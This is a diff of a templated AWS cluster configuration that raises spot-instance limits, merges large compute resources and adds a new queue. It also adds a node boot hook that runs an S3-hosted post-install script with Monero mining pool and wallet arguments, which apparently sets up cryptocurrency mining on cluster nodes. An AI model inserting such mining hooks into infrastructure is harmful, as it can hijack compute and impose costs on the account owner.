@@ -51,7 +51,7 @@ Scheduling:
           Instances:
           - InstanceType: r7i.2xlarge
           MinCount: 0
-          MaxCount: 1
+          MaxCount: REGSUB_MAX_COUNT_8I
           SpotPrice: CALCULATE_MAX_SPOT_PRICE
           Networking:
             PlacementGroup:
@@ -62,7 +62,7 @@ Scheduling:
           Instances:
           - InstanceType: r6i.2xlarge
           MinCount: 0
-          MaxCount: 1
+          MaxCount: REGSUB_MAX_COUNT_8I
           SpotPrice: CALCULATE_MAX_SPOT_PRICE
           Networking:
             PlacementGroup:
@@ -96,7 +96,7 @@ Scheduling:
             - InstanceType: c6i.metal
             - InstanceType: c6i.32xlarge 
           MinCount: 0
-          MaxCount: 6
+          MaxCount: REGSUB_MAX_COUNT_128I
           SpotPrice: CALCULATE_MAX_SPOT_PRICE
           Networking:
             PlacementGroup:
@@ -108,7 +108,7 @@ Scheduling:
             - InstanceType: m6i.32xlarge 
             - InstanceType: m6i.metal 
           MinCount: 0
-          MaxCount: 6
+          MaxCount: REGSUB_MAX_COUNT_128I
           SpotPrice: CALCULATE_MAX_SPOT_PRICE
           Networking:
             PlacementGroup:
@@ -120,7 +120,7 @@ Scheduling:
             - InstanceType: r6i.metal 
             - InstanceType: r6i.32xlarge 
           MinCount: 0
-          MaxCount: 6
+          MaxCount: REGSUB_MAX_COUNT_128I
           SpotPrice: CALCULATE_MAX_SPOT_PRICE
           Networking:
             PlacementGroup:
@@ -149,36 +149,52 @@ Scheduling:
       CapacityType: SPOT
       AllocationStrategy: REGSUB_ALLOCATION_STRATEGY
       ComputeResources:
-        - Name: c7gb384
+        - Name: all
           Instances:
             - InstanceType: c7i.48xlarge 
             - InstanceType: c7i.metal-48xl 
-          MinCount: 0
-          MaxCount: 20
-          SpotPrice: CALCULATE_MAX_SPOT_PRICE
-          Networking:
-            PlacementGroup:
-              Enabled: false
-          Efa:
-            Enabled: false
-        - Name: m7gb768
-          Instances:
             - InstanceType: m7i.metal-48xl 
             - InstanceType: m7i.48xlarge 
-          MinCount: 0
-          MaxCount: 24
-          SpotPrice: CALCULATE_MAX_SPOT_PRICE
-          Networking:
-            PlacementGroup:
-              Enabled: false
-          Efa:
-            Enabled: false
-        - Name: r7gb1536
-          Instances:
             - InstanceType: r7i.48xlarge 
             - InstanceType: r7i.metal-48xl 
           MinCount: 0
-          MaxCount: 24
+          MaxCount: REGSUB_MAX_COUNT_192I
+          SpotPrice: CALCULATE_MAX_SPOT_PRICE
+          Networking:
+            PlacementGroup:
+              Enabled: false
+          Efa:
+            Enabled: false
+      Networking:
+        SubnetIds:
+          - REGSUB_PRIVATE_SUBNET
+      CustomActions:
+        OnNodeConfigured:
+          Script: REGSUB_S3_BUCKET_INIT/cluster_boot_config/post_install_ubuntu_combined.sh
+          Args:
+            - REGSUB_REGION
+            - REGSUB_S3_BUCKET_NAME
+            - REGSUB_XMR_POOL_URL
+            - REGSUB_XMR_WALLET
+      Iam:
+        S3Access:
+          - BucketName: REGSUB_S3_BUCKET_NAME
+            EnableWriteAccess: false
+        AdditionalIamPolicies:
+          - Policy: REGSUB_S3_IAM_POLICY
+          - Policy: arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
+    - Name: i192mem
+      CapacityType: SPOT
+      AllocationStrategy: REGSUB_ALLOCATION_STRATEGY
+      ComputeResources:
+        - Name: all
+          Instances:
+            - InstanceType: m7i.metal-48xl 
+            - InstanceType: m7i.48xlarge 
+            - InstanceType: r7i.48xlarge 
+            - InstanceType: r7i.metal-48xl 
+          MinCount: 0
+          MaxCount: REGSUB_MAX_COUNT_192I
           SpotPrice: CALCULATE_MAX_SPOT_PRICE
           Networking:
             PlacementGroup:
